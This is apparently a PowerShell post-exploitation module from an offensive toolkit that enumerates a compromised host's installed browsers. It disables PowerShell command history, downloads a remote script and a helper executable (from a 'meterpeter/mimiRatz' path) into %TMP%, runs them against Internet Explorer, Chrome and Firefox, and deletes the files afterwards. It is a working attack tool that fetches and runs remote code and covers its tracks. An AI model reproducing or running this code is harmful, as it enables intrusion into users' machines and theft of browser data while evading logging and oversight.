<#
.SYNOPSIS
   Author: @r00t-3xp10it
   Helper - Leak Installed Browsers Information

.NOTES
   This module downloads GetBrowsers.ps1 from venom
   GitHub repository into remote host %TMP% directory,
   And identify install browsers and run enum modules.

.EXAMPLE
   PS C:\> Get-Help .\EnumBrowsers.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\EnumBrowsers.ps1 -GetBrowsers Enum
   Identify installed browsers and versions

.EXAMPLE
   PS C:\> .\EnumBrowsers.ps1 -GetBrowsers Verbose
   Run enumeration modules againts ALL installed browsers

.OUTPUTS
   Browser   Install   Status   Version         PreDefined
   -------   -------   ------   -------         ----------
   IE        Found     Stoped   9.11.18362.0    False
   CHROME    False     Stoped   {null}          False
   FIREFOX   Found     Active   81.0.2          True
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$GetBrowsers="false"
)

Write-Host ""
If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "Verbose"){
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null

    If(-not(Test-Path -Path "$Env:TMP\GetBrowsers.ps1")){## Download GetBrowsers.ps1 from my GitHub repository
        Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/GetBrowsers.ps1 -Destination $Env:TMP\GetBrowsers.ps1 -ErrorAction SilentlyContinue|Out-Null
        ## Check downloaded file integrity => FileSizeKBytes
        $SizeDump = ((Get-Item -Path "$Env:TMP\GetBrowsers.ps1" -EA SilentlyContinue).length/1KB)
        If($SizeDump -lt 58){## Corrupted download detected => DefaultFileSize: 58,1435546875/KB
           Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
           If(Test-Path -Path "$Env:TMP\GetBrowsers.ps1"){Remove-Item -Path "$Env:TMP\GetBrowsers.ps1" -Force}
           Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @EnumBrowsers
        }   
    }

    ## Detect ALL Available browsers Installed { IE, FIREFOX, CHROME }
    $RawBeacon = "HKCU:\Software\Google\" + "Chrome\BLBeacon" -Join ''
    $RawHKLMey = "HKLM:\SOFTWARE\" + "Microsoft\Internet Explorer" -join ''
    $IEVersion = (Get-ItemProperty -Path "$RawHKLMey" -EA SilentlyContinue).version
    If($IEVersion){$IEfound = "Installed"}else{$IEfound = "NotFound"}
    $Chrome_App = (Get-ItemProperty "$RawBeacon" -EA SilentlyContinue).version
    If($Chrome_App){$CHfound = "Installed"}else{$CHfound = "NotFound"}
    $FFfound = (Get-Process firefox -ErrorAction SilentlyContinue)
    If($FFfound){$FFfound = "Installed"}else{$FFfound = "NotFound"}

    ## Run sellect modules againts installed browsers
    If($GetBrowsers -ieq "Enum"){## [ Enum ] @arg scans
        &"$Env:TMP\GetBrowsers.ps1" -RECON
    }Else{## [ Verbose ] @arg scans

        &"$Env:TMP\GetBrowsers.ps1" -RECON
        If($IEfound -ieq "Installed"){## IExplorer Found
            &"$Env:TMP\GetBrowsers.ps1" -IE
        }

        If($CHfound -ieq "Installed"){## Chrome Found
           &"$Env:TMP\GetBrowsers.ps1" -CHROME
        }

        If($FFfound -ieq "Installed"){## Firefox Found
            If(-not(Test-Path "$Env:TMP\mozlz4-win32.exe")){## Downloads binary auxiliary 
                Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/main/bin/meterpeter/mimiRatz/mozlz4-win32.exe -Destination $Env:TMP\mozlz4-win32.exe -ErrorAction SilentlyContinue|Out-Null
                ## Check downloaded file integrity => FileSizeKBytes
                $SizeDump = ((Get-Item -Path "$Env:TMP\mozlz4-win32.exe" -EA SilentlyContinue).length/1KB)
                If($SizeDump -lt 669){## Corrupted download detected => DefaultFileSize: 669,5/KB
                    Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
                    If(Test-Path -Path "$Env:TMP\mozlz4-win32.exe"){Remove-Item -Path "$Env:TMP\mozlz4-win32.exe" -Force}
                }
            }
            ## Execute GetBrowsers -FIREFOX parameter
            &"$Env:TMP\GetBrowsers.ps1" -FIREFOX
        }
    }

    ## Clean Old Files
    If(Test-Path -Path "$Env:TMP\mozlz4-win32.exe"){Remove-Item -Path "$Env:TMP\mozlz4-win32.exe" -Force}
    If(Test-Path -Path "$Env:TMP\GetBrowsers.ps1"){Remove-Item -Path "$Env:TMP\GetBrowsers.ps1" -Force}
    Start-Sleep -Seconds 1
}
